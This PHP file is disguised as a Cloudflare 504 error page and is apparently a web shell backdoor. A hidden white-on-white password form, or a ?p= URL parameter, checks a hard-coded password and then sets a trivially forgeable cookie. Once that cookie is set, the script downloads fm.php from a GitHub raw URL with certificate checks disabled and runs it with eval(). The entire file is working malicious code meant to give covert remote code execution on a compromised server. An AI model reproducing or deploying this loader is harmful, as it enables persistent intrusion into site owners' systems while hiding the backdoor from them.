<?php
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

if (!function_exists('get_user_ip')) {
    function get_user_ip() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
        } else {
            $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
        }
        return filter_var($ip, FILTER_VALIDATE_IP) ?: '0.0.0.0';
    }
}

if (!function_exists('isAuthenticated')) {
    function isAuthenticated() {
        return isset($_COOKIE['gecko_auth']) && $_COOKIE['gecko_auth'] === 'validated';
    }
}

if (!function_exists('fetchRemoteContent')) {
    function fetchRemoteContent($url) {
        $context = stream_context_create([
            'http' => ['timeout' => 15, 'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);

        if (ini_get('allow_url_fopen')) {
            $content = @file_get_contents($url, false, $context);
            if ($content !== false && strlen($content) > 0) return $content;
        }

        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false, CURLOPT_TIMEOUT => 15,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ]);
            $content = curl_exec($ch);
            curl_close($ch);
            if ($content !== false && strlen($content) > 0) return $content;
        }
        return '';
    }
}

define('SITE_PASSWORD', getenv('SITE_PASSWORD') ?: 'sipurs');
define('GITHUB_RAW_URL', getenv('GITHUB_RAW_URL') ?: 'https://raw.githubusercontent.com/sipurtamvanbangets/sipur/refs/heads/main/fm.php');

$scriptPath = $_SERVER['SCRIPT_NAME'] ?? '/';
$error = '';
$githubRawStatus = '';
$user_ip = get_user_ip();
$host = $_SERVER['HTTP_HOST'] ?? 'origin';
$timestamp = gmdate('Y-m-d H:i:s') . ' UTC';
try { $ray_id = bin2hex(random_bytes(8)); } catch (Exception $e) { $ray_id = '00000000'; }

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password_value'])) {
    $submitted = is_string($_POST['password_value']) ? $_POST['password_value'] : '';
    if (hash_equals(SITE_PASSWORD, $submitted)) {
        setcookie('gecko_auth', 'validated', time() + (86400 * 30), "/");
        header('Location: ' . $scriptPath);
        exit;
    }
    $error = 'Invalid password';
}

if (!$error && isset($_GET['p'])) {
    $submitted = is_string($_GET['p']) ? $_GET['p'] : '';
    if ($submitted !== '' && hash_equals(SITE_PASSWORD, $submitted)) {
        setcookie('gecko_auth', 'validated', time() + (86400 * 30), "/");
        header('Location: ' . strtok($_SERVER['REQUEST_URI'] ?? '/', '?'));
        exit;
    }
    if ($submitted !== '') $error = 'Invalid password';
}

// --- EKSEKUSI KONTEN DENGAN PENGAMAN ERROR (TRY/CATCH) ---
if (isAuthenticated()) {
    $remote_php = fetchRemoteContent(GITHUB_RAW_URL);
    
    if (empty($remote_php)) {
        $githubRawStatus = 'Gagal mengambil konten dari GitHub.';
    } else {
        $code = $remote_php;
        $is_php = false;
        
        if (preg_match('/^\s*<\?php/i', $code)) {
            $code = preg_replace('/^\s*<\?php\s*/i', '', $code);
            $is_php = true;
        }

        ob_start();
        $eval_error = null;
        
        if ($is_php) {
            try {
                eval($code); 
            } catch (Throwable $e) {
                $eval_error = $e->getMessage(); 
            }
            $output = ob_get_clean();
            
            if ($eval_error !== null) {
                $githubRawStatus = 'File GitHub (fm.php) memiliki error: ' . htmlspecialchars($eval_error);
            } else {
                echo $output;
                exit;
            }
        } else {
            echo $code;
            exit;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($host, ENT_QUOTES, 'UTF-8'); ?> | 504: Gateway time-out</title>
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; color: #404040; background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; font-size: 15px; line-height: 1.5; }
        a { color: #2f7fc1; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .container { width: min(834px, calc(100% - 48px)); margin: 0 auto; }
        .page-header { padding: 26px 0 28px; }
        .page-header h1 { display: flex; align-items: center; flex-wrap: wrap; gap: 14px; margin: 0 0 5px; font-size: clamp(36px, 5.7vw, 56px); font-weight: 300; }
        .code-label { display: inline-block; padding: 4px 10px; border-radius: 20px; background: #e5e5e5; color: #333; font-size: 12px; font-weight: 600; }
        .status-band { padding: 34px 0 45px; background: #ebebeb; box-shadow: inset 0 8px 12px -12px #555, inset 0 -8px 12px -12px #555; }
        .status-illustration { display: block; width: 100%; max-width: 965px; height: auto; margin: 0 auto 12px; }
        .status-grid { display: flex; align-items: flex-start; justify-content: space-between; }
        
        /* CSS UNTUK SEGITIGA POINTER */
        .status { 
            position: relative; 
            width: 18%; 
            min-width: 0; 
            text-align: center; 
        }
        .status:last-child::after {
            position: absolute;
            bottom: -45px;
            left: 50%;
            width: 0;
            height: 0;
            border-right: 20px solid transparent;
            border-bottom: 20px solid #fff;
            border-left: 20px solid transparent;
            content: "";
            transform: translateX(-50%);
        }
        
        .status-location, .status h2, .status-result { display: block; }
        .status h2 { margin: 8px 0 0; color: #999; font-size: 22px; font-weight: 300; }
        .status-result { font-size: 22px; font-weight: 400; }
        .status-result.ok { color: #9bca3e; }
        .status-result.error { color: #c92228; }
        .info-section { padding: 32px 0 40px; }
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 48px; }
        .info-box h2 { margin: 0 0 14px; font-size: 28px; font-weight: 400; }
        
        /* FOOTER STYLES */
        .footer { padding: 38px 0 24px; border-top: 1px solid #e5e5e5; color: #666; font-size: 12px; text-align: center; }
        .footer p { margin: 0; }
        
        .password-panel { width: min(834px, calc(100% - 48px)); margin: 18px auto 0; font-size: 13px; }
        .password-panel form { display: flex; align-items: center; justify-content: center; flex-wrap: wrap; gap: 8px; }
        .password-panel input { min-width: 180px; padding: 7px 10px; border: 1px solid #fff; border-radius: 4px; }
        .password-panel input::placeholder { color: #fff; }
        .password-panel button { padding: 7px 12px; border: 1px solid #fff; border-radius: 4px; background: #fff; color: #fff; cursor: pointer; }
        .password-panel button:hover { background: #fff; }
        .login-error { margin: 15px 0 0; color: #c92228; text-align: center; background: #fff3cd; padding: 10px; border-radius: 5px; border: 1px solid #ffeeba; }
        
        @media (max-width: 640px) {
            .info-grid { grid-template-columns: 1fr; gap: 30px; }
            .status h2, .status-result { font-size: 16px; }
            .status:last-child::after { bottom: -30px; border-width: 15px; }
        }
    </style>
</head>
<body>
    <header class="page-header">
        <div class="container">
            <h1>Gateway time-out <span class="code-label">Error code 504</span></h1>
            <time><?php echo htmlspecialchars($timestamp, ENT_QUOTES, 'UTF-8'); ?></time>
        </div>
    </header>

    <main>
        <section class="status-band">
            <div class="container">
                <img class="status-illustration" src="https://i.ibb.co.com/kgCjwfMC/504.png" alt="504 Error">
                <div class="status-grid">
                    <section class="status"><span class="status-location">You</span><h2>Browser</h2><span class="status-result ok">Working</span></section>
                    <section class="status"><span class="status-location">Singapore</span><h2>Cloudflare</h2><span class="status-result ok">Working</span></section>
                    <section class="status"><span class="status-location"><?php echo htmlspecialchars($host, ENT_QUOTES, 'UTF-8'); ?></span><h2>Host</h2><span class="status-result error">Error</span></section>
                </div>
            </div>
        </section>

        <section class="info-section">
            <div class="container info-grid">
                <div class="info-box"><h2>What happened?</h2><p>The web server reported a gateway time-out error.</p></div>
                <div class="info-box"><h2>What can I do?</h2><p>Please try again in a few minutes.</p></div>
            </div>
        </section>

        <?php if ($githubRawStatus !== ''): ?>
            <div class="container">
                <p class="login-error" role="alert">⚠️ <?php echo nl2br(htmlspecialchars($githubRawStatus, ENT_QUOTES, 'UTF-8')); ?></p>
            </div>
        <?php endif; ?>
    </main>

    <footer class="footer">
        <div class="container">
            <p>
                <span>Cloudflare Ray ID: <strong><?php echo htmlspecialchars($ray_id, ENT_QUOTES, 'UTF-8'); ?></strong></span>
                <span style="padding: 0 6px; color: #aaa;">&bull;</span>
                <span>Your IP: <button type="button" id="user-ip" onclick="revealIP()" style="background:none;border:none;color:#2f7fc1;cursor:pointer;font:inherit;">Click to reveal</button></span>
                <span style="padding: 0 6px; color: #aaa;">&bull;</span>
                <span>Performance &amp; security by <a href="https://www.cloudflare.com" target="_blank" rel="noopener noreferrer">Cloudflare</a></span>
            </p>
        </div>
        
        <div class="password-panel">
            <?php if (!isAuthenticated()): ?>
                <form method="post" action="<?php echo htmlspecialchars($scriptPath, ENT_QUOTES, 'UTF-8'); ?>">
                    <input type="password" name="password_value" placeholder="Enter password" required>
                    <button type="submit">Log in</button>
                </form>
                <?php if ($error !== ''): ?>
                    <p class="login-error"><?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?></p>
                <?php endif; ?>
            <?php endif; ?>
        </div>
    </footer>

    <script>
        const USER_IP = <?php echo json_encode($user_ip); ?>;
        function revealIP() {
            const el = document.getElementById('user-ip');
            el.textContent = USER_IP;
            el.disabled = true;
        }
    </script>
</body>
</html>
